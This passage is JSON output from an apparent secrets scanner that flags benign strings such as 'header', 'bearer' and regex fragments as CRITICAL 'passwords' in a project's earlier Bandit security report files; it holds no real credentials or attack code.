            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451058,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: '[^\\\\\\\\W\\\\\\\\d]\\\\\\\\w*'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451072,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: '(?=\\\\\\\\s|#|[)\\\\\\\\]]|$)'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451079,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: '[A-Z]\\\\\\\\w*'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451121,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'access_token'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451128,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'refresh_token'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451135,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'header'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451142,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'header'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451149,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'header'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451156,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'header'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451163,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'header'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451170,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'header'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451177,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'access_token'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451184,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'refresh_token'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451191,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'bearer'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451198,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'header'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451205,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'header'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451212,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'client_secret_basic'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451226,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'bearer'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451233,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'bearer'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451240,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'header'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451247,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'bearer'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451254,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'client_secret_basic'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451261,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'bearer'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451268,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: '[-!#$%&'*+.^_`|~0-9a-zA-Z]+'\\\",\",\n          \"severity\": \"h"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451275,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'environment'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451282,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'keyword'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451289,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: '#bygroup'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451317,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'lbracket'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451324,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'lparen'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451345,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'lparen'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451380,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'OTEL_EXPORTER_JAEGER_PASSWORD'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451436,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'struct'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451450,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: '[^\\\\\\\\W\\\\\\\\d]\\\\\\\\w*'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451464,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: '(?=\\\\\\\\s|#|[)\\\\\\\\]]|$)'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451471,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: '[A-Z]\\\\\\\\w*'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 109635,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'SSSSSS'\",\n      \"line_number\": 107,\n      \"line_range\": ["
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 110156,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'access_token'\",\n      \"line_number\": 28,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 110176,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'refresh_token'\",\n      \"line_number\": 30,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 110196,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'header'\",\n      \"line_number\": 24,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 110243,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'header'\",\n      \"line_number\": 81,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 110295,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'header'\",\n      \"line_number\": 70,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 110351,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'header'\",\n      \"line_number\": 218,\n      \"line_range\": ["
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 110406,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'header'\",\n      \"line_number\": 32,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 110456,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'header'\",\n      \"line_number\": 91,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 110511,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'access_token'\",\n      \"line_number\": 50,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 110531,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'refresh_token'\",\n      \"line_number\": 52,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 110691,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'bearer'\",\n      \"line_number\": 89,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 110711,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'header'\",\n      \"line_number\": 92,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 110735,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'header'\",\n      \"line_number\": 53,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 110817,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'client_secret_basic'\",\n      \"line_number\": 77,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 110857,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'bearer'\",\n      \"line_number\": 19,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 110877,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'bearer'\",\n      \"line_number\": 13,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 110897,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'header'\",\n      \"line_number\": 17,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 110952,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'bearer'\",\n      \"line_number\": 32,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 110972,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'client_secret_basic'\",\n      \"line_number\": 67,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 110992,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'bearer'\",\n      \"line_number\": 7,\n      \"line_range\": [\n "
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 139148,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: '[-!#$%&'*+.^_`|~0-9a-zA-Z]+'\",\n      \"line_number\": 17,\n  "
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 139678,
            "severity": "CRITICAL",
            "context": "    assert auth is not None\\n75         username, password = auth\\n\",\n      \"col_offset\": 8,\n      \"end_col_offset\": 3"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 140038,
            "severity": "CRITICAL",
            "context": "    assert auth is not None\\n75         username, password = auth\\n\",\n      \"col_offset\": 8,\n      \"end_col_offset\": 3"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 140278,
            "severity": "CRITICAL",
            "context": "ed\"\n    },\n    {\n      \"code\": \"295     username, password = value\\n296     if password == \\\"-\\\":  # pragma: no cover\\n29"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 140278,
            "severity": "CRITICAL",
            "context": "ssword == \\\"-\\\":  # pragma: no cover\\n297         password = click.prompt(\\\"Password\\\", hide_input=True)\\n\",\n      \"col_offset"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 140888,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'environment'\",\n      \"line_number\": 1440,\n      \"line_range\": "
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 141419,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'keyword'\",\n      \"line_number\": 639,\n      \"line_range\": ["
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 141459,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: '#bygroup'\",\n      \"line_number\": 765,\n      \"line_range\": ["
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 141699,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'lbracket'\",\n      \"line_number\": 784,\n      \"line_range\": ["
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 141719,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'lparen'\",\n      \"line_number\": 788,\n      \"line_range\": ["
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 141779,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'lparen'\",\n      \"line_number\": 803,\n      \"line_range\": ["
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 172927,
            "severity": "CRITICAL",
            "context": "er.add_password(realm=None, uri=proxy, user=user, passwd=password)\\n1208         opener.add_handler(ProxyBasicAuthHandler("
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 173088,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'OTEL_EXPORTER_JAEGER_PASSWORD'\",\n      \"line_number\": 238,\n      \"line_range\": ["
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 222735,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'struct'\",\n      \"line_number\": 478,\n      \"line_range\": ["
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 225430,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: '[^\\\\W\\\\d]\\\\w*'\",\n      \"line_number\": 17,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 225498,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: '(?=\\\\s|#|[)\\\\]]|$)'\",\n      \"line_number\": 3041,\n      \"line_range\": "
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 225518,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: '[A-Z]\\\\w*'\",\n      \"line_number\": 334,\n      \"line_range\": ["
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 268178,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'access_token'\",\n      \"line_number\": 28,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 268198,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'refresh_token'\",\n      \"line_number\": 30,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 268218,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'header'\",\n      \"line_number\": 24,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 268265,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'header'\",\n      \"line_number\": 81,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 268317,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'header'\",\n      \"line_number\": 70,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 268373,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'header'\",\n      \"line_number\": 218,\n      \"line_range\": ["
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 268428,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'header'\",\n      \"line_number\": 32,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 268478,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'header'\",\n      \"line_number\": 91,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 268533,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'access_token'\",\n      \"line_number\": 50,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 268553,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'refresh_token'\",\n      \"line_number\": 52,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 268713,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'bearer'\",\n      \"line_number\": 89,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 268733,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'header'\",\n      \"line_number\": 92,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 268757,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'header'\",\n      \"line_number\": 53,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 268839,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'client_secret_basic'\",\n      \"line_number\": 77,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 268879,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'bearer'\",\n      \"line_number\": 19,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 268899,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'bearer'\",\n      \"line_number\": 13,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 268919,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'header'\",\n      \"line_number\": 17,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 268974,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'bearer'\",\n      \"line_number\": 32,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 268994,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'client_secret_basic'\",\n      \"line_number\": 67,\n      \"line_range\": [\n"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 269014,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'bearer'\",\n      \"line_number\": 7,\n      \"line_range\": [\n "
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 294236,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: '[-!#$%&'*+.^_`|~0-9a-zA-Z]+'\",\n      \"line_number\": 17,\n  "
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 294766,
            "severity": "CRITICAL",
            "context": "    assert auth is not None\\n75         username, password = auth\\n\",\n      \"col_offset\": 8,\n      \"end_col_offset\": 3"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 295126,
            "severity": "CRITICAL",
            "context": "    assert auth is not None\\n75         username, password = auth\\n\",\n      \"col_offset\": 8,\n      \"end_col_offset\": 3"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 295366,
            "severity": "CRITICAL",
            "context": "ed\"\n    },\n    {\n      \"code\": \"295     username, password = value\\n296     if password == \\\"-\\\":  # pragma: no cover\\n29"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 295366,
            "severity": "CRITICAL",
            "context": "ssword == \\\"-\\\":  # pragma: no cover\\n297         password = click.prompt(\\\"Password\\\", hide_input=True)\\n\",\n      \"col_offset"
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 295956,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'environment'\",\n      \"line_number\": 1440,\n      \"line_range\": "
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 296487,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'keyword'\",\n      \"line_number\": 639,\n      \"line_range\": ["
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 296527,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: '#bygroup'\",\n      \"line_number\": 765,\n      \"line_range\": ["
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 296767,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'lbracket'\",\n      \"line_number\": 784,\n      \"line_range\": ["
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 296787,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'lparen'\",\n      \"line_number\": 788,\n      \"line_range\": ["
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 296847,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'lparen'\",\n      \"line_number\": 803,\n      \"line_range\": ["
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 327364,
            "severity": "CRITICAL",
            "context": "er.add_password(realm=None, uri=proxy, user=user, passwd=password)\\n1208         opener.add_handler(ProxyBasicAuthHandler("
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 327525,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'OTEL_EXPORTER_JAEGER_PASSWORD'\",\n      \"line_number\": 238,\n      \"line_range\": ["
          },
          {
            "file": "mcp_learning_system/bandit_security_report.json",
            "type": "passwords",
            "line": 377152,
            "severity": "CRITICAL",
            "context": "\": \"LOW\",\n      \"issue_text\": \"Possible hardcoded password: 'struct'\",\n      \"line_number\": 478,\n      \"line_range\": ["
          },
